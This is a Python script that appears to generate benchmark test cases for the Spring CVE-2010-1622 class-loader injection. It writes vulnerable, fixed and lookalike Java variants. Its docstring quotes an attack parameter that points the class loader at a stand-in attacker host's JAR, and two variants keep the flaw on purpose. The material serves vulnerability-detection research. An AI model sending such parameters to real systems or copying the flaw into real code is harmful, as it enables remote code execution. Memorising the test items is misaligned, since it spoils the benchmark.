"""
Section 9 ground-truth test bundle: CASE-0295
(spring-projects/spring-framework, org.springframework.beans/src/main/java/
org/springframework/beans/CachedIntrospectionResults.java constructor,
CVE-2010-1622, CWE-94 code injection via class-loader manipulation
("class.classLoader" data binding).

Core vulnerable mechanism: Spring's data binder resolves bean property
names by JavaBeans introspection. Every Java object has `getClass()`, so
every bean exposes a `class` property, and `java.lang.Class` in turn exposes
`getClassLoader()` as a `classLoader` property. A web request parameter such
as `class.classLoader.URLs[0]=jar:http://attacker/evil.jar!/` (or
`class.classLoader.resources...`) is therefore a valid nested property path
on any command/form object: the binder walks bean -> Class -> ClassLoader
and lets the request WRITE to the application's class loader (adding a
remote JAR URL to a URLClassLoader, or altering Tomcat's resources), which
leads to remote code execution. The upstream fix makes the constructor skip
the `classLoader` property when introspecting `java.lang.Class` itself
(`if (Class.class.equals(beanClass) && "classLoader".equals(pd.getName()))
continue;`), so `class.classLoader` is no longer a resolvable property. (The
same commit also restructures descriptor caching, which is incidental to the
security property.)

Sibling sites: one introspection loop (the constructor) builds the property
descriptor cache; one place to fix.

Verification: each FULL file is compiled with javac (JDK 26) as a
replacement for `CachedIntrospectionResults` against the REAL
`spring-beans`/`spring-core`/`spring-asm` 3.0.2.RELEASE jars from Maven
Central (the version line this code belongs to) and driven through the
real `BeanWrapperImpl` on a plain `Object`: `isReadableProperty(
"class.classLoader")` (the binder's path resolution used before a write) is
`true` for the vulnerable code and `false` when fixed; the control
`isReadableProperty("class.name")` must stay `true` in every variant (the
fix must not remove legitimate `class` properties).

Every variant is the FULL real file. `CachedIntrospectionResults` is an
internal class called by name within Spring's beans package, so its name is
kept.
"""
from pathlib import Path

CASE_DIR = Path(__file__).resolve().parent.parent.parent / "benchmark" / "cases" / "CASE-0295"
original = (CASE_DIR / "vulnerable_source.java").read_text()
patched = (CASE_DIR / "patched_source.java").read_text()
assert "\r" not in original


def swap(text, old, new):
    assert text.count(old) == 1 and new != old
    return text.replace(old, new)


T = "\t"
LOOP = (T * 3 + "PropertyDescriptor[] pds = this.beanInfo.getPropertyDescriptors();\n" +
        T * 3 + "for (PropertyDescriptor pd : pds) {\n")
assert original.count(LOOP) == 1
PUT = (T * 4 + "pd = new GenericTypeAwarePropertyDescriptor(beanClass, pd.getName(), pd.getReadMethod(),\n" +
       T * 6 + "pd.getWriteMethod(), pd.getPropertyEditorClass());\n" +
       T * 4 + "this.propertyDescriptorCache.put(pd.getName(), pd);\n")
assert original.count(PUT) == 1

# --- Variant 1: renamed vulnerable variant ---
v1 = swap(original, LOOP, (T * 3 + "PropertyDescriptor[] descriptors = this.beanInfo.getPropertyDescriptors();\n" +
                           T * 3 + "for (PropertyDescriptor pd : descriptors) {\n"))
v1 = swap(v1, PUT, (T * 4 + "PropertyDescriptor typed = new GenericTypeAwarePropertyDescriptor(beanClass, pd.getName(), pd.getReadMethod(),\n" +
                    T * 6 + "pd.getWriteMethod(), pd.getPropertyEditorClass());\n" +
                    T * 4 + "this.propertyDescriptorCache.put(typed.getName(), typed);\n"))
(CASE_DIR / "variant_vulnerable_01.java").write_text(v1)

# --- Variant 2: structurally changed vulnerable variant ---
v2 = swap(original, PUT, (T * 4 + "cacheDescriptor(beanClass, pd);\n"))
v2 = swap(v2, T + "BeanInfo getBeanInfo() {\n",
          (T + "private void cacheDescriptor(Class beanClass, PropertyDescriptor pd) throws IntrospectionException {\n" +
           T * 2 + "pd = new GenericTypeAwarePropertyDescriptor(beanClass, pd.getName(), pd.getReadMethod(),\n" +
           T * 4 + "pd.getWriteMethod(), pd.getPropertyEditorClass());\n" +
           T * 2 + "this.propertyDescriptorCache.put(pd.getName(), pd);\n" +
           T + "}\n\n" + T + "BeanInfo getBeanInfo() {\n"))
(CASE_DIR / "variant_vulnerable_02.java").write_text(v2)

# --- Variant 3: transformed safe variant (real patched file, skip test extracted) ---
SKIP = (T * 4 + "if (Class.class.equals(beanClass) && \"classLoader\".equals(pd.getName())) {\n" +
        T * 5 + "// Ignore Class.getClassLoader() method - nobody needs to bind to that\n" +
        T * 5 + "continue;\n" + T * 4 + "}\n")
assert patched.count(SKIP) == 1
v3 = swap(patched, SKIP, (T * 4 + "if (isIgnoredProperty(beanClass, pd)) {\n" + T * 5 + "continue;\n" + T * 4 + "}\n"))
v3 = swap(v3, T + "BeanInfo getBeanInfo() {\n",
          (T + "private static boolean isIgnoredProperty(Class beanClass, PropertyDescriptor pd) {\n" +
           T * 2 + "// Class.getClassLoader() must never be bindable (class.classLoader.* injection).\n" +
           T * 2 + "return Class.class.equals(beanClass) && \"classLoader\".equals(pd.getName());\n" +
           T + "}\n\n" + T + "BeanInfo getBeanInfo() {\n"))
(CASE_DIR / "variant_safe_01.java").write_text(v3)

(CASE_DIR / "benign_lookalike.java").write_text('''package org.springframework.beans;

import java.beans.PropertyDescriptor;

/**
 * Standalone example of the same shape: skip a well-known, harmless
 * "class" bookkeeping property when listing bean properties for a
 * documentation table (display filtering only, not a binding decision).
 */
class DocPropertyFilter {

    static boolean shouldList(PropertyDescriptor pd) {
        return !"class".equals(pd.getName());
    }
}
''')
